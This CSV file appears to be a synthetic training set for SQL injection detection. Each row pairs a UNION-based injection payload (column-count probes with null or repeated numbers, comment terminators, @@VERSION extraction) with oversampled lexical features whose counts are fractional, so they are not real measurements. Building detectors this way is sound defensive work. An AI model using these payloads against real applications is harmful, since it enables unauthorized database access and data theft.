id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000221,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R001332,0.3804217426201639,68.42573982903836,24.514852034192327,4.200077357855787,27.0,21.940591863230694,11.0,8.485147965807673,0.39603369709249686,0.31889239760615196,0.16134706177842462,0.12372684352292654,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,3.485147965807673,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000222,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000649,0.07885665541545761,73.37240859845106,21.937240859845105,3.7398678549918447,14.0,43.497926878760836,4.0,11.87448171969021,0.19104440025795716,0.5925803654342179,0.05458411435941635,0.16179111994840856,0.0,1.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,8.87448171969021,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000223,attack,union,"1%""  )   union all select null#",nearest_attack_euclidean,R000695,0.5624632447123034,34.28808537383324,16.274007114486103,3.4729168736135354,19.096028457944414,1.0,9.644042686916618,4.548014228972207,0.5617339425861054,0.02979138381557897,0.27656462138315774,0.13191005221515786,0.0,1.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.274007114486103,1.0,0.0,0.2740071144861034,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000224,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000322,0.07034308206842106,99.59386958413141,27.837547833652565,3.6720763051580754,25.0,39.67509566730513,22.0,12.918773916826282,0.25112814004407946,0.39819497592947295,0.22099276323878989,0.12968412078765776,1.0,0.0,3.0,-2.168404344971009e-19,0.0,1.0,0.0,2.0,0.0,0.0,5.918773916826281,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000225,attack,union,"1%'  )   union all select null,null,null--",nearest_attack_euclidean,R000455,0.3020830197501872,39.89512561376672,17.0,3.55080251524782,24.316100491013383,1.0,8.0,6.579025122753345,0.6087535100801977,0.02516401183155295,0.20131209465242353,0.1647703834358259,1.0,0.0,2.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,1.0,0.0,1.5790251227533454,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000226,attack,union,"-1985%'   )    )     )   union all select 3051,3051,3051--",nearest_attack_euclidean,R001304,0.29519253652577176,58.75178427019514,22.0,3.7830390906399054,14.0,17.20285483231222,17.39857258384389,10.150356854039028,0.23849891084216424,0.29166311766584196,0.29709498987395544,0.1727429816180384,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.8496431459609726,1.0,0.0,2.300713708078055,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000227,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R001086,0.2418179923444461,105.64811477312944,28.329622954625886,4.059590473459704,29.0,45.31849181850354,15.0,16.329622954625883,0.2746299110426294,0.4287761202458251,0.14204995398756692,0.1545440147239786,3.0,0.0,3.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,7.329622954625885,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000228,attack,union,"-3860' union all select 3510,3510,3510#",nearest_attack_euclidean,R000686,0.21452361337286405,39.811333567744825,20.67546657290207,4.1017416466643954,14.0,16.64906685419586,4.0,5.162266713548965,0.3523550874426413,0.417443047919418,0.10067288212646894,0.12952898251147174,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,2.1622667135489646,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000229,attack,union,"-7083 union all select 7705,7705,7705,7705,7705#",nearest_attack_euclidean,R001163,0.3723883459262658,49.81983583785907,19.363967167571815,3.791903763883994,14.0,25.455868670287252,4.0,6.363967167571814,0.2816518468042347,0.5103009575727873,0.08047195622978133,0.1275752393931968,0.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,4.363967167571813,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000230,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000903,0.029534837217410174,74.0,20.08877265588467,3.3942658305114306,14.0,44.0,4.0,12.0,0.18918918918918917,0.5945945945945946,0.05405405405405406,0.16216216216216217,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,9.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000231,attack,union,"1   )    )    as zmsa where 6909  =  6909 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001075,0.06137501659724966,94.48532187951064,24.0,3.712425664068514,53.3882575036085,9.0,22.0,10.097064375902127,0.5649875505829718,0.09527531733122763,0.23289522014300088,0.10684191194279966,0.0,0.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,2.0,0.0,0.0,6.097064375902127,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000232,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000916,0.14230445356452381,74.91208231401836,26.817583537196327,3.9101587249490284,19.0,32.72966585121469,14.0,9.182416462803673,0.25379241122710416,0.43667612708540876,0.18700493458839257,0.1225265270990945,0.0,1.0,1.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,4.182416462803673,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000233,attack,union,"1' where 6721  =  6721 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000891,0.16817828071551294,88.67273539531755,22.0,3.55417198036877,57.93818831625404,9.0,10.0,11.734547079063509,0.6533000732208011,0.10156148777021465,0.11284609752246072,0.13229234148652358,1.0,0.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,0.0,0.0,0.0,8.73454707906351,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000234,attack,union,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",nearest_attack_euclidean,R000326,0.20747307271043985,78.84816990908813,21.769633981817627,3.7311705966065563,14.0,43.07853592727051,8.0,13.769633981817627,0.17768760354546104,0.5461605663636271,0.10153577345454916,0.1746160566363627,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,8.769633981817627,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000235,attack,union,"-9175'   )    )    union all select 6174,6174,6174,6174--",nearest_attack_euclidean,R001552,0.3685327866365715,59.53560008133759,21.0,3.816844952306529,14.0,22.028480065070074,14.0,9.50712001626752,0.23556921303375034,0.36924486759542796,0.23556921303375034,0.15961670633707137,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,3.5071200162675185,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000236,attack,union,"1%'   )    )     )   union all select null,null,null#",nearest_attack_euclidean,R000638,0.30090204161760764,55.0782124330428,17.0,3.2397037254751817,27.662569946434242,1.0,18.0,8.415642486608562,0.5016534430390052,0.018191863229328947,0.3274535381279211,0.15270115560374473,1.0,0.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,3.0,1.0,0.0,2.41564248660856,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000237,attack,union,"-8771""   )    )    union all select 6302,6302,6302,6302,6302#",nearest_attack_euclidean,R000646,0.2695579450826686,61.0,22.539860864622273,3.879953572603961,14.0,24.0,14.0,9.0,0.22950819672131148,0.39344262295081966,0.22950819672131148,0.14754098360655737,0.0,1.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000238,attack,union,"-2116%'   )    )     )   union all select 7119,7119,7119,7119,7119--",nearest_attack_euclidean,R000547,0.4150693717596932,66.65277115676656,21.269445768646687,3.6791213141657955,14.0,24.0,16.922216925413252,11.730554231353313,0.21028506157919422,0.36048867699290443,0.253258839894095,0.17596742153380637,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.730554231353313,1.0,0.0,4.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000239,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000558,0.09172945141157832,55.0,19.20987274701922,3.7979137321165615,14.0,28.0,4.0,9.0,0.2545454545454545,0.509090909090909,0.07272727272727271,0.16363636363636364,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,5.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000240,attack,union,"-8735'   )    )    union all select 3262,3262,3262--",nearest_attack_euclidean,R001004,0.37088066897870037,54.4772807344868,21.0,3.8243702233293693,14.0,17.981824587589436,14.0,8.495456146897359,0.25752971312995443,0.3290885245623691,0.2575297131299544,0.1558520491777221,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,2.495456146897359,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000241,attack,union,"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",nearest_attack_euclidean,R001413,0.33534775420025975,79.22143848157552,24.27785615184245,3.8674399894392186,46.77715078526042,9.0,16.0,7.444287696315104,0.5897486244570043,0.11399170963174463,0.20265192823421269,0.09360773767703834,0.0,0.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,4.444287696315104,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000242,attack,union,"1%""  )   union all select null,null--",nearest_attack_euclidean,R001417,0.09346516040525542,37.66569229382791,17.0,3.5698033361286607,22.532553835062327,1.0,8.0,6.133138458765583,0.5975038881156367,0.026644225247942577,0.2131538019835404,0.16269808465288044,0.0,1.0,2.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,1.0,0.0,1.1331384587655822,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000243,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001288,0.03254968556223459,66.26086914742987,16.0,3.161343156960867,46.2086953179439,1.0,8.0,11.052173829485975,0.6973482522839358,0.01509584525236235,0.12076676201889906,0.16678914044480275,0.0,1.0,2.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,7.052173829485976,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000244,attack,union,"-2784'   )    )    union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#",nearest_attack_euclidean,R001510,0.0006689167661274647,81.0,21.997709890269537,3.551739711316646,14.0,40.0,14.0,13.0,0.1728395061728395,0.49382716049382713,0.1728395061728395,0.16049382716049382,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000245,attack,union,"-3037  )   where 9024  =  9024 union all select 9024,9024--",nearest_attack_euclidean,R000491,0.028781054431244967,59.06218371187454,24.04145580791636,4.013064436244247,19.12436742374908,19.91708838416728,14.04145580791636,5.97927209604182,0.32371683637932736,0.3373057792313774,0.23771878641356525,0.10125859797572995,0.0,0.0,3.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,0.9792720960418198,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000246,attack,union,"-5728  )   where 8663  =  8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",nearest_attack_euclidean,R000923,0.07041309504992554,98.38479510623252,25.09619877655813,3.592951469423366,19.288596329674384,52.0,14.09619877655813,13.0,0.19589635476411935,0.528686046830565,0.14324608669767436,0.13217151170764127,0.0,0.0,1.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,9.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000247,attack,union," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000144,0.01930606230629578,80.80468913571325,27.0,3.935671827192876,43.869792757142164,2.967448189285541,23.96744818928554,10.0,0.5428883771781288,0.03669946270370189,0.2966338706296314,0.12377828948853786,0.0,0.0,2.0,-2.168404344971009e-19,1.0,1.0,0.0,2.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000248,attack,union,"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",nearest_attack_euclidean,R001338,0.6417366676110126,75.88809738791781,21.0,3.644836144891213,14.0,35.91047791033425,14.0,11.977619477583561,0.1852837135401062,0.47178313601466904,0.18528371354010617,0.15764943690511857,0.0,1.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,6.977619477583561,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000249,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R001086,0.4437884964016477,103.68571757180489,28.468571757180488,4.156655876214371,29.0,43.7485740574439,15.0,15.937143514360976,0.2803367797625483,0.4210620080451072,0.14500178263580085,0.15359942955654374,3.0,0.0,3.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,6.937143514360976,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000250,attack,union,"1'+  (  select gajr where 6653  =  6653 union all select null,null,null,null#",nearest_attack_euclidean,R000365,0.30665747662974363,75.68507998261185,25.26298400347763,3.994416918679467,43.94806398608948,9.0,15.0,7.737015996522371,0.5792101417163724,0.11970534485256917,0.1995089080876153,0.10157560534344312,1.0,0.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,2.7370159965223704,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000251,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000342,0.08255759014097583,68.37301482834974,21.87460296566995,3.795224500386207,14.0,39.498411862679795,4.0,10.874602965669949,0.20488627545360139,0.5775520437932329,0.058538935843886086,0.15902274490927973,0.0,1.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,7.874602965669949,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000252,attack,union,"-9337  )   union all select 5648,5648,5648,5648,5648#",nearest_attack_euclidean,R000461,0.7476411545553027,48.03618614370487,21.503618614370488,4.034966407526132,14.0,20.028948914963895,8.0,6.0072372287409745,0.2946438762563106,0.4127537626345632,0.16836792928932032,0.12423443181980584,0.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,3.0072372287409737,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000253,attack,union," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000117,0.34644776271905997,87.0,32.21400087583522,4.027300368038849,42.0,4.130999854027463,29.0,11.869000145972535,0.4827586206896552,0.0474827569428444,0.3333333333333333,0.1364252890341671,0.0,0.0,2.0,-2.168404344971009e-19,1.0,2.0,0.0,2.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.130999854027464,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
